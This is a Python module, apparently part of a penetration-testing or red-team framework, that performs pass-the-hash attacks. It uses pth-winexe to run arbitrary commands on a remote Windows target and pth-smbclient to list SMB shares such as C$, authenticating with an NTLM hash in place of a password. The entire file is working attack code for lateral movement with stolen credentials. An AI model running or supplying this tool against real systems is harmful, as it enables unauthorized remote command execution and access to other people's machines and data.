#!/usr/bin/env python3
"""
pass_the_hash — Pass-the-hash execution via pth-winexe and pth-smbclient.

CLI deps: pth-winexe, pth-smbclient (pth-toolkit on Kali)

Executes commands or accesses SMB shares using NTLM hashes directly.
"""

import json
import time

from base_module import TacticalModule


class PassTheHash(TacticalModule):
    name = "pass_the_hash"
    description = "Pass-the-hash execution via pth-winexe and pth-smbclient"

    def _add_module_args(self) -> None:
        self.parser.add_argument("--target", required=True, help="Target IP")
        self.parser.add_argument("--username", required=True, help="Username")
        self.parser.add_argument("--hash", required=True, help="NTLM hash (LM:NT format)")
        self.parser.add_argument("--domain", default="WORKGROUP", help="Domain (default: WORKGROUP)")
        self.parser.add_argument(
            "--mode", choices=["exec", "smb"], default="exec",
            help="Mode: exec=run command, smb=list shares",
        )
        self.parser.add_argument("--command", help="Command to execute (exec mode)")
        self.parser.add_argument("--share", help="SMB share to access (smb mode)")

    def run(self, args) -> None:
        if not self.validate_hash(args.hash):
            self.output_error(f"Invalid NTLM hash format: {args.hash}")
            return

        start = time.monotonic()

        if args.mode == "exec":
            if not args.command:
                self.output_error("--command required for exec mode")
                return
            result = self._run_winexe(args)
        else:
            result = self._run_smbclient(args)

        duration_ms = int((time.monotonic() - start) * 1000)

        self.log_run(args.db_path, self.name, json.dumps(vars(args), default=str),
                     result["exit_code"], result.get("output", "")[:5000], "", duration_ms)
        result["duration_ms"] = duration_ms
        self.output_success(result)

    def _run_winexe(self, args) -> dict:
        pth_args = [
            f"-U{args.domain}/{args.username}%{args.hash}",
            f"//{args.target}",
            args.command,
        ]
        result = self.run_tool("pth-winexe", pth_args, timeout=args.timeout)
        return {
            "mode": "exec", "target": args.target, "command": args.command,
            "output": result.stdout[:5000], "exit_code": result.returncode,
        }

    def _run_smbclient(self, args) -> dict:
        smb_args = [
            f"//{args.target}/{args.share or 'C$'}",
            "-U", f"{args.domain}/{args.username}%{args.hash}",
            "-c", "ls",
        ]
        result = self.run_tool("pth-smbclient", smb_args, timeout=args.timeout)
        return {
            "mode": "smb", "target": args.target, "share": args.share or "C$",
            "output": result.stdout[:5000], "exit_code": result.returncode,
        }


if __name__ == "__main__":
    PassTheHash().execute()
